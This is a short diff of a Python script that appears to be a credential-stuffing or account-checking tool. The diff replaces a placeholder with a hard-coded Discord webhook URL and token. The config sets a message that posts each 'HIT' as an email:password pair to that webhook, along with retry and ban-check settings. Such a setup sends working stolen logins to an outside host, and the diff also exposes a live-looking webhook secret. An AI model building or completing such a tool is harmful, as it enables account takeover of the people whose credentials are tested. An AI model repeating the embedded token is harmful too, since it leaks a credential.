@@ -597,7 +597,7 @@ def loadconfig():
     if not os.path.isfile("config.ini"):
         c = configparser.ConfigParser(allow_no_value=True)
         c['Settings'] = {
-            'Webhook': 'paste your discord webhook here',
+            'Webhook': 'https://discord.com/api/webhooks/1472157818587971735/7cHBxm8clSIMh7_QxLO1jIMMMv0epMXFe6BsDY6w9WDfcVFYw9dUBGHuMElPMTVjfdUg',
             'Max Retries': 5,
             'Proxyless Ban Check': False,
             'WebhookMessage': '''@everyone HIT: ||`<email>:<password>`||
@@ -756,6 +756,7 @@ def Main():
     finishedscreen()
     input()
 Main()
+
 
 
 
